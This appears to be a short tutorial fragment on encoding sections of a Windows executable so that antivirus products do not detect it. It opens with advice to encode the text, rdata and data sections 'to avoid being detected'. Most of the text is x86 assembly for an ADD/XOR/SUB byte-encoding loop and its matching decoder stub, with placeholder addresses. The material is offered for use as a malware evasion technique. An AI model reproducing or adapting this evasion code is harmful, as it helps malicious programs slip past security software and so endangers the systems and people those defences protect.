REMEMBER, sometimes you might need to encode more than one section to avoid being detected.
For example, in the article, they had to encode the text, rdata, and data section to avoid detection.

Simple encoder:
          + 3 operation
          + An Addition
          + XOR 
          + subtraction
   
ENCODER:

MOV EAX, {ADDRESS OF THE START OF WHERE YOU WANT TO ENCODE IT}
ADD BYTE PTR DS:[EAX],12
XOR BYTE PTR DS:[EAX],3E
SUB BYTE PTR DS:[EAX],11
INC EAX
CMP EAX, {ADDRESS OF THE END OF WHERE YOU WANT TO ENCODE IT}
JLE SHORT {BACK TO THE ADD INSTRUCTION}


DECODER:

MOV EAX, {ADDRESS OF THE START OF WHERE YOU WANT TO ENCODE IT}
ADD BYTE PTR DS:[EAX],11
XOR BYTE PTR DS:[EAX],3E
SUB BYTE PTR DS:[EAX],12
INC EAX
CMP EAX, {ADDRESS OF THE END OF WHERE YOU WANT TO ENCODE IT}
JLE SHORT {BACK TO THE ADD INSTRUCTION}
